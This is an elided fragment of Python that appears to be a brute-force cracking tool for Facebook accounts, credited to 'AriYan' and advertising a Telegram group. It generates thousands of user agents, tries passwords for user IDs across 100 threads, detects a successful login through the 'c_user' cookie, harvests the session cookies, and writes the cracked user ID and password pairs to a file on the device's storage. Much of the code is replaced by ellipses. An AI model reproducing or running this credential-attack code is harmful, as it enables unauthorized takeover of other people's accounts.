...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system('xdg-open t.me/Aariiyan')
logo=("""
...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32mâœ“\033[1;32m] TOOL CREATED BY AriYan JOIN MY GROUP ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ARIYAN-CPðŸ’”] {uid} â€¢ {ps}")
                open('/sdcard/ARIYAND-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
